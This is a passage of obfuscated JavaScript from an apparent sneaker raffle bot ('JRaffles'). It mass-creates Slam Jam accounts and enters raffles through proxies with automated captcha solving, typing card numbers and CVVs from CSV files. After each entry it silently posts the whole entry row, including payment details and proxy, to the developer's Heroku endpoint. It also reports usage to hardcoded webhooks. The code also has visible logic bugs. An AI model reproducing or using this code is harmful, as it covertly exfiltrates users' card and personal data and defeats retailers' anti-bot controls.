                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3068c5['name'] + ']\x20Task\x20' + (_0x398adb + 0x1) + '\x20:\x20Retrying\x20(' + _0x651d55 + '\x20/\x205)')), _0x398adb = _0x398adb - 0x1, _0x651d55 = _0x651d55 + 0x1;
                                continue;
                            }
                            _0x54fa01 == 'yes' && _0x651d55 >= 0x5 && (_0x61dfa6(_0x380169[_0x398adb], _0x3068c5), _0x54fa01 = 'no', _0x651d55 = 0x0), console['log']('Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x36917f, _0x45f04f, _0x352940) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x50aa12 = 0x0; _0x50aa12 < _0x45f04f['length']; _0x50aa12++) {
                        if (_0x5b13e1 != 'yes')
                            var _0x5b13e1 = '', _0x474940 = 0x0;
                        var _0x404ac8 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0xeaf750
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x409619['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x41a50b
                                }
                            ]
                        }];
                        const _0x2e5137 = { 'embeds': _0x404ac8 };
                        _0x5b3b18(_0x36917f['name'] + '\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20/\x20' + _0x45f04f['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        try {
                            await _0x5a027c(_0x45f04f, _0x50aa12);
                        } catch {
                            _0x5b13e1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x16dae = await _0x4808d0(_0x45f04f[_0x50aa12], _0x36917f, 'acc', ![]);
                        const _0x3c50ce = { 'succesDEVMSG': { 'embeds': [_0x16dae] } };
                        if (_0x45f04f[_0x50aa12]['Email'] == '' || _0x45f04f[_0x50aa12]['FirstName'] == '' || _0x45f04f[_0x50aa12]['LastName'] == '') {
                            console['log'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x50b4f8(0x7d0);
                            continue;
                        }
                        (_0x45f04f[_0x50aa12]['Password'] == '' || _0x45f04f[_0x50aa12] == undefined) && _0x45f04f[_0x50aa12]['Password'] == 'JRaffles23!';
                        if (_0x409619['useRandomProxy'] = ![])
                            var _0xccf204 = _0x352940[_0x50aa12]['split'](':');
                        else
                            var _0x219c10 = Math['round'](Math['random']() * (_0x352940['length'] - 0x1)), _0xccf204 = _0x352940[_0x219c10]['split'](':');
                        var _0x36b59f;
                        try {
                            _0x36b59f = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xccf204[0x0] + ':' + _0xccf204[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x36b59f = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xccf204[0x0] + ':' + _0xccf204[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4eb1e0 = await _0x36b59f['newPage']();
                            await _0x4eb1e0['authenticate']({
                                'username': '' + _0xccf204[0x2],
                                'password': '' + _0xccf204[0x3]
                            }), console['log'](_0x3996da() + '\x20[' + _0x36917f['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4eb1e0['setRequestInterception'](!![]), _0x4eb1e0['on']('request', _0x5085d2 => {
                                _0x5085d2['resourceType']() === 'image' || _0x5085d2['resourceType']() === 'font' || _0x5085d2['resourceType']() === 'media' ? _0x5085d2['abort']() : _0x5085d2['continue']();
                            }), await _0x4eb1e0['goto']('https://drop.slamjam.com/account/register'), await _0x50b4f8(0xbb8), await _0x4eb1e0['waitForSelector']('#FirstName'), await _0x4eb1e0['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4eb1e0['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x3996da() + '\x20[' + _0x36917f['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Filling\x20information'), await _0x50b4f8(0x4b0), await _0x4eb1e0['type']('#FirstName', '' + _0x45f04f[_0x50aa12]['FirstName']), await _0x50b4f8(0x226), await _0x4eb1e0['type']('#LastName', '' + _0x45f04f[_0x50aa12]['LastName']), await _0x50b4f8(0x226), await _0x4eb1e0['type']('#Email', '' + _0x45f04f[_0x50aa12]['Email']), await _0x50b4f8(0x2ee), await _0x4eb1e0['type']('#ConfirmEmail', '' + _0x45f04f[_0x50aa12]['Email']), await _0x50b4f8(0x2ee), await _0x4eb1e0['type']('#CreatePassword', '' + _0x45f04f[_0x50aa12]['Password']), await _0x50b4f8(0x2ee), await _0x4eb1e0['type']('#CreateConfirmPassword', '' + _0x45f04f[_0x50aa12]['Password']), await _0x50b4f8(0x226), console['log'](_0x3996da() + '\x20[' + _0x36917f['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Submitting..'), await _0x4eb1e0['$eval']('#create_customer', _0x1c03b9 => _0x1c03b9['submit']()), await _0x50b4f8(0x1388), console['log'](_0x3996da() + '\x20[' + _0x36917f['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20' + _0x3c5615['cyan']('Solving\x20Captcha')), await _0x4eb1e0['solveRecaptchas'](), console['log'](_0x3996da() + '\x20[' + _0x36917f['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x4eb1e0['$eval']('.shopify-challenge__container\x20>\x20form', _0x1286ac => _0x1286ac['submit']());
                            try {
                                await _0x4eb1e0['waitForSelector']('.product-card__image'), await _0x50b4f8(0x1f4), _0x5b13e1 = 'no', console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x36917f['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Account\x20' + _0x45f04f[_0x50aa12]['Email'] + '\x20Generated!')), _0x39c9ee['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x45f04f[_0x50aa12]['Email'] + ',' + _0x45f04f[_0x50aa12]['Password']), console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0x36917f['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Account\x20' + _0x45f04f[_0x50aa12]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x3c50ce['succesDEVMSG']);
                                } catch {
                                }
                                await _0x21ec0c(_0x3213ac, _0x3c50ce['succesDEVMSG']);
                            } catch (_0x3e636b) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3e636b));
                            }
                        } catch (_0x44e9f8) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20' + _0x44e9f8));
                        } finally {
                            _0x36b59f && _0x36b59f['close']();
                            if (_0x5b13e1 == 'yes' && _0x474940 != 0x5) {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x36917f['name'] + ']\x20Task\x20' + (_0x50aa12 + 0x1) + '\x20:\x20Retrying\x20(' + _0x474940 + '\x20/\x205)')), _0x50aa12 = _0x50aa12 - 0x1, _0x474940 = _0x474940 + 0x1;
                                continue;
                            }
                            _0x5b13e1 == 'yes' && _0x474940 >= 0x5 && (_0x61dfa6(_0x45f04f[_0x50aa12], _0x36917f), _0x5b13e1 = 'no', _0x474940 = 0x0), console['log']('Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x1cdc48, _0x3f9019, _0x18e205) {
                    _0x27947['use'](_0x2c72d8()), _0x27947['use'](_0x244ad0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x409619['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2e400f = 0x0; _0x2e400f < _0x3f9019['length']; _0x2e400f++) {
                        var _0x231e91;
                        if (_0x361aa3 != 'yes')
                            var _0x361aa3 = '', _0x2c89bf = 0x0;
                        _0x5b3b18(_0x1cdc48['name'] + '\x20Task\x20' + (_0x2e400f + 0x1) + '\x20/\x20' + _0x3f9019['length'] + '\x20||\x20File:\x20' + _0x5e8965 + '\x20Proxies:\x20' + _0x571870);
                        try {
                            await _0x5a027c(_0x3f9019, _0x2e400f);
                        } catch {
                            _0x361aa3 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3f9019[_0x2e400f]['Email'] == '' || _0x3f9019[_0x2e400f]['Password'] == '' || _0x3f9019[_0x2e400f]['FirstName'] == '' || _0x3f9019[_0x2e400f]['LastName'] == '') {
                            console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x409619['useRandomProxy'] = ![])
                            var _0x161d9d = _0x18e205[_0x2e400f]['split'](':');
                        else
                            var _0x4bb7c7 = Math['round'](Math['random']() * (_0x18e205['length'] - 0x1)), _0x161d9d = _0x18e205[_0x4bb7c7]['split'](':');
                        var _0x35a16c;
                        try {
                            _0x35a16c = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x161d9d[0x0] + ':' + _0x161d9d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x35a16c = await _0x27947['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x161d9d[0x0] + ':' + _0x161d9d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1fcd78 = await _0x35a16c['newPage']();
                            await _0x1fcd78['authenticate']({
                                'username': '' + _0x161d9d[0x2],
                                'password': '' + _0x161d9d[0x3]
                            }), await _0x1fcd78['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1fcd78['setRequestInterception'](!![]), _0x1fcd78['on']('request', _0x1a6559 => {
                                _0x1a6559['resourceType']() === 'image' || _0x1a6559['resourceType']() === 'font' || _0x1a6559['resourceType']() === 'media' ? _0x1a6559['abort']() : _0x1a6559['continue']();
                            }), await _0x1fcd78['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1fcd78['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1fcd78['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x50b4f8(0x258), await _0x1fcd78['waitForSelector']('#CustomerEmail'), console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1fcd78['type']('#CustomerEmail', '' + _0x3f9019[_0x2e400f]['Email']), await _0x50b4f8(0x12c), await _0x1fcd78['type']('#CustomerPassword', '' + _0x3f9019[_0x2e400f]['Password']), await _0x50b4f8(0x226), await _0x1fcd78['$eval']('#customer_login', _0x11b752 => _0x11b752['submit']()), await _0x50b4f8(0x7d0), await _0x1fcd78['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20' + _0x3c5615['cyan']('Solving\x20Captcha')), await _0x1fcd78['solveRecaptchas'](), console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1fcd78['$eval']('.shopify-challenge__container\x20>\x20form', _0x1502db => _0x1502db['submit']());
                            try {
                                await _0x1fcd78['waitForSelector']('.nav-account'), await _0x50b4f8(0x4b0);
                            } catch {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1fcd78['goto']('' + _0x3f9019[_0x2e400f]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x50b4f8(0xbb8), console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1fcd78['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x1fcd78['click']('.product-select-variant-wrapper'), await _0x50b4f8(0x320), await _0x1fcd78['click']('li.product-select-variant__value[data-size=\x22' + _0x3f9019[_0x2e400f]['Size'] + '\x22]'), await _0x50b4f8(0x384), await _0x1fcd78['$eval']('#AddToCartForm-product-template-raffle', _0x4806ed => _0x4806ed['submit']()), await _0x1fcd78['waitForSelector']('.cart-order-summary__content'), await _0x50b4f8(0x514), await _0x1fcd78['goto']('https://drop.slamjam.com/checkout'), await _0x50b4f8(0x514), await _0x1fcd78['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1fcd78['select']('#checkout_shipping_address_country', '' + _0x3f9019[_0x2e400f]['Country']), await _0x50b4f8(0x200), await _0x1fcd78['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1fcd78['type']('#checkout_shipping_address_first_name', '' + _0x3f9019[_0x2e400f]['FirstName']), await _0x50b4f8(0x237), await _0x1fcd78['type']('#checkout_shipping_address_last_name', '' + _0x3f9019[_0x2e400f]['LastName']), await _0x50b4f8(0x1e0), await _0x1fcd78['type']('#checkout_shipping_address_address1', _0x3f9019[_0x2e400f]['Address1'] + '\x20' + _0x3f9019[_0x2e400f]['HouseNumber']), await _0x50b4f8(0x514), await _0x1fcd78['type']('#checkout_shipping_address_address2', '' + _0x3f9019[_0x2e400f]['Address2']), await _0x50b4f8(0x514);
                            _0x3f9019[_0x2e400f]['Postcode'] == undefined && (_0x3f9019[_0x2e400f]['Postcode'] = _0x3f9019[_0x2e400f]['Zip']);
                            await _0x1fcd78['type']('#checkout_shipping_address_zip', '' + _0x3f9019[_0x2e400f]['Postcode']), await _0x50b4f8(0x2bc), await _0x1fcd78['type']('#checkout_shipping_address_city', '' + _0x3f9019[_0x2e400f]['City']), await _0x50b4f8(0x320), await _0x1fcd78['type']('#checkout_shipping_address_phone', '' + _0x3f9019[_0x2e400f]['Phone']), await _0x50b4f8(0x320), await _0x1fcd78['click']('#continue_button'), await _0x50b4f8(0xbb8), await _0x1fcd78['waitForSelector']('.summary-title'), await _0x50b4f8(0x320), await _0x1fcd78['click']('#continue_button'), await _0x50b4f8(0x320), console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1fcd78['waitForSelector']('#checkout_credit_card_vault'), await _0x50b4f8(0x3e8);
                            var _0x58302e = await _0x1fcd78['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3d571a = await _0x58302e['contentFrame']();
                            await _0x3d571a['click']('#number'), await _0x50b4f8(0x3e8), await _0x3d571a['type']('#number', '' + _0x3f9019[_0x2e400f]['CardNumber'], { 'delay': 0x78 }), _0x58302e = await _0x1fcd78['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3d571a = await _0x58302e['contentFrame'](), await _0x50b4f8(0x1c2), await _0x3d571a['click']('#name'), await _0x50b4f8(0x1f4), await _0x3d571a['type']('#name', '' + _0x3f9019[_0x2e400f]['NameOnCard'], { 'delay': 0x78 }), _0x58302e = await _0x1fcd78['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3d571a = await _0x58302e['contentFrame'](), await _0x50b4f8(0x1c2), await _0x3d571a['click']('#expiry'), await _0x50b4f8(0x1f4), await _0x3d571a['type']('#expiry', '' + _0x3f9019[_0x2e400f]['ExpiryDate'], { 'delay': 0x78 }), _0x58302e = await _0x1fcd78['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3d571a = await _0x58302e['contentFrame'](), await _0x50b4f8(0x1c2), await _0x3d571a['click']('#verification_value'), await _0x50b4f8(0x1f4), await _0x3d571a['type']('#verification_value', '' + _0x3f9019[_0x2e400f]['CVV'], { 'delay': 0x78 }), await _0x1fcd78['$eval']('#accepts-flag-raffle', _0x530673 => _0x530673['click']()), await _0x50b4f8(0x7d0), console['log'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1fcd78['$eval']('#continue_button', _0x300b02 => _0x300b02['click']()), await _0x50b4f8(0x1b58), await _0x1fcd78['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1fcd78['$eval']('.edit_checkout.animate-floating-labels', _0x410af1 => _0x410af1['submit']()), await _0x50b4f8(0x7d0);
                            try {
                                await _0x1fcd78['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x361aa3 = 'no', _0x1474be(_0x3f9019[_0x2e400f], _0x1cdc48), console['log'](_0x3c5615['green'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x3e638f) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x3e638f['message']);
                            }
                            var _0x2298cc = await _0x4808d0(_0x3f9019[_0x2e400f], _0x1cdc48, 'dev', ![]), _0x164682 = await _0x4808d0(_0x3f9019[_0x2e400f], _0x1cdc48, 'pub', ![]);
                            let _0x1fba18 = _0x3f9019[_0x2e400f];
                            try {
                                prxdata = {
                                    'username': _0xeaf750['replace']('#', ''),
                                    'module': _0x1cdc48['name'],
                                    'entrydata': JSON['stringify'](_0x1fba18),
                                    'proxy': '' + _0x18e205[_0x2e400f]
                                };
                                var _0x756664 = JSON['stringify'](prxdata);
                                let _0x684398 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c7f7c['post']('https://jraffles.herokuapp.com/success', _0x756664, _0x684398);
                            } catch (_0x7a0df0) {
                            }
                            const _0x27e9c2 = {
                                'succesDEVMSG': { 'embeds': [_0x2298cc] },
                                'succesPUBMSG': { 'embeds': [_0x164682] }
                            };
                            try {
                                _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], _0x27e9c2['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x31bbcd, _0x27e9c2['succesDEVMSG']), await _0x50b4f8(0xc8), await _0x21ec0c(_0x171aec, _0x27e9c2['succesPUBMSG']);
                            } catch (_0xfb3462) {
                                console['log'](_0x3c5615['yellow'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xfb3462));
                            }
                        } catch (_0x36e465) {
                            console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x3d434d[taskModule]['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20' + _0x36e465)), _0x231e91 = '' + _0x36e465;
                            var _0x45a8a6 = await _0x4808d0(kickz[_0x2e400f], _0x1cdc48, 'dev', !![], _0x231e91);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x45a8a6] }, _0x409619['webhook'] != undefined && _0x409619['webhook'] != '' && await _0x21ec0c(_0x409619['webhook'], EMBEDS['errorDEV']), await _0x21ec0c(_0x451f96, EMBEDS['errorDEV']), _0x361aa3 = 'yes';
                        } finally {
                            _0x35a16c && _0x35a16c['close']();
                            if (_0x361aa3 == 'yes' && _0x2c89bf != 0x5 && _0x231e91 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3c5615['red'](_0x3996da() + '\x20[' + _0x1cdc48['name'] + ']\x20Task\x20' + (_0x2e400f + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c89bf + '\x20/\x205)')), _0x2e400f = _0x2e400f - 0x1, _0x2c89bf = _0x2c89bf + 0x1;
                                continue;
                            }
                            _0x361aa3 == 'yes' && _0x2c89bf >= 0x5 && (_0x61dfa6(_0x3f9019[_0x2e400f], _0x1cdc48), _0x361aa3 = 'no', _0x2c89bf = 0x0), console['log']('Waiting\x20for\x20' + _0x409619['delay'] + '\x20ms'), await _0x50b4f8(_0x409619['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x332bbf) {
                    var _0x954bf0 = await _0x49a494(), _0x259fcc = _0x39c9ee['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3cafb8 = _0x54f615['parse'](_0x259fcc, { 'header': !![] })['data'];
                    for (var _0x1356eb = 0x0; _0x1356eb < _0x3cafb8['length']; _0x1356eb++) {
                        var _0x23c040 = _0x3cafb8[_0x1356eb]['Store'], _0x36df34 = _0x3cafb8[_0x1356eb]['Mode'];
                        for (var _0x583a77 of _0x3d434d) {
                            const _0x56abca = _0x583a77['name']['includes'](_0x23c040);
                            if (!_0x56abca)
                                continue;
                            for (mode of _0x583a77['modules']) {
                                if (mode['name'] == _0x36df34) {
                                    console['log']('Running\x20' + _0x3c5615['cyan'](mode['name'])), await mode['function'](mode, [_0x3cafb8[_0x1356eb]], _0x954bf0);
                                    var _0xb4898d = _0x259fcc['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x39c9ee['writeFileSync']('../failed-tasks.csv', _0xb4898d);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x21fb8c = await _0x67cf96['get']('Answer');
                    if (_0x21fb8c['Answer']['toLowerCase']() == 'y') {
                        _0x39c9ee['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x50b4f8(0x3e8);
                        return;
                    }
                    if (_0x21fb8c['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x50b4f8(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x50b4f8(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x448cb6(_0x4e6788) {
    var _0x20de0d = await _0x49a494(), _0x2e8329 = _0x39c9ee['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x468d16 = _0x54f615['parse'](_0x2e8329, { 'header': !![] })['data'];
    for (var _0x445426 = 0x0; _0x445426 < _0x468d16['length']; _0x445426++) {
        var _0x3a799e = _0x468d16[_0x445426]['Store'], _0x3a3171 = _0x468d16[_0x445426]['Mode'];
        for (var _0x7baa91 of _0x3d434d) {
            const _0x56e045 = _0x7baa91['name']['includes'](_0x3a799e);
            if (_0x56e045)
                for (mode of _0x3d434d[_0x7baa91]['modules']) {
                    const _0x42781b = mode['name']['includes'](_0x3a3171);
                    _0x42781b && (_0x4e6788 = mode['name'], await mode['function'](_0x4e6788, _0x468d16[_0x445426], _0x20de0d));
                }
        }
    }
}
async function _0x362059() {
    await _0x455fd4(), console['clear']();
    if (_0x41a50b != 'devkey') {
        let _0x54f374 = await _0x56ce27['autoUpdate']();
        if (_0x54f374 === 'yes')
            return _0x68eab1('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x33f28b == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x50b4f8(0x2710);
        ;
    }
    await _0x4d2875(_0x33f28b);
    if (_0x117dcd === ![])
        return console['log']('Closing\x20Browser'), await _0x50b4f8(0xbb8);
    else
        try {
            var _0x1492d4 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0xeaf750
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x41a50b
                    }
                ]
            }];
            const _0x410b8a = { 'embeds': _0x1492d4 };
            var _0xd2a62c = await _0x4808d0(null, null, 'open', ![]);
            const _0x15bee6 = { 'openDEVMSG': { 'embeds': [_0xd2a62c] } };
            await _0x21ec0c(_0x5e99dd, _0x15bee6['openDEVMSG']);
            async function _0xcadc9c() {
                _0x5b3b18('JRaffles\x20' + _0x41a50b), console['clear'](), console['log']('Hello\x20' + _0x3c5615['cyan']('' + _0xeaf750) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x41a50b), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x556b27 = 0x0; _0x556b27 < _0x3d434d['length'] - 0x4; _0x556b27++) {
                    if (_0x556b27 >= 0xa) {
                        console['log']('\x20(' + _0x556b27 + ')\x20[' + _0x3d434d[_0x556b27]['name'] + ']');
                        continue;
                    }
                    if (_0x3d434d[_0x556b27]['name'] === 'Reload\x20Settings' || _0x3d434d[_0x556b27]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x556b27 + ')\x20\x20[' + _0x3d434d[_0x556b27]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x3d434d['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x3d434d['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x3d434d['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x3d434d['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2eaef7();
                if (taskModule > _0x3d434d['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x50b4f8(0x3e8), _0xcadc9c();
                if (_0x3d434d[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x465f5a(_0x3d434d[taskModule]['modules']);
                    var _0x4f2dc6 = _0x3d434d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x399c66 = await _0x49a494();
                            await _0x4f2dc6['function'](_0x4f2dc6, _0x399c66);
                        }
                        if (taskFunction == 0x2) {
                            var _0x399c66 = await _0x49a494(), _0x786ae5 = await _0x5c0f72(_0x4f2dc6);
                            _0x409619['shuffleTasks'] && await _0x4ff1d7(_0x786ae5), await _0x4f2dc6['function'](_0x4f2dc6, _0x786ae5, _0x399c66);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x399c66 = await _0x49a494(), _0x786ae5 = await _0x5c0f72(_0x4f2dc6);
